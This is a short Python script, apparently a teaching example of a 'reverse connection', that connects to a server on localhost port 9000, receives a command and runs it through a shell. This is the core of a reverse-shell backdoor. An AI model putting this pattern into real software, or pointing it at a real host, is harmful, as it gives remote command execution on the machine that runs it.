import socket
import subprocess
# simple script to illustrate a reverse connection using python sockets

# initialie or get a socket from teh OS
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to a server
client_socket.connect(('127.0.0.1', 9000))

# receive the message from the server, 
# but it shouldn't exceed 1024 bytes, and this is why we passed a Buffer size
# arg of 1024
cmd = client_socket.recv(1024).decode('utf-8')

subprocess.run(cmd, shell=True, capture_output=True)